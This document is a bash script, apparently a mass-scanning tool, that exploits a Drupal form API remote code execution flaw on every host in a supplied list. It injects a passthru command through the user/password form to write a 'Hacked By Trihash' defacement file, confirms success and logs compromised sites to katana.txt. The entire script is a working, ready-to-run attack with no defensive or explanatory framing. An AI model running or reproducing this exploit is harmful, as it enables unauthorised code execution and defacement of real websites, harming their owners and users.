#!/bin/bash

croustibat() {
    target=$1
    echo "Je tente ma chance ###"
    upload=$(curl -s -X POST -b cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=echo+"Hacked+By+Trihash"+>>+3H.txt" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | grep -Po '(?<=value=")[^" \>]*' | head -1);
    curl -s -X POST -b cookie.tmp "${target}/?q=file/ajax/name/%23value/${upload}" --data "form_build_id=${upload}" | head -1 > /dev/null
    cassoulet=$(curl -s "${target}/3H.txt");
    if [[ $cassoulet =~ 'Trihash' ]]; then
      echo "GG mek"
      echo "$target/3H.txt" | tee -a katana.txt
    else
        echo
        echo "Nan : $target";
    fi
}

cat << "drakar"
------------------------------
 _    __                     
| |  / /__  _________  ____ _
| | / / _ \/ ___/ __ \/ __ `/
| |/ /  __(__  ) /_/ / /_/ / 
|___/\___/____/ .___/\__,_/  
             /_/                        
    
-------[ Monte à bord ]-------
 
drakar

for s in $(cat $1); do
    echo "À voir $s"
    echo -ne "### ";
    croustibat $s
done
rm cookie.tmp
